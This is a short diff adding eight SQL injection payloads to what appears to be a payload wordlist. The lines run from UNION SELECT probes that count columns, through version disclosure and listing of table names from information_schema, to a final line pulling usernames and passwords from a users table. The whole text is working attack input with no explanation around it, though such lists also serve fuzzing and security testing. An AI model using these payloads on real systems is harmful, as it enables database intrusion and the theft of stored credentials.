@@ -1,0 +1,8 @@
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION ALL SELECT NULL,NULL--
+' UNION SELECT @@version,NULL--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT username,password FROM users--
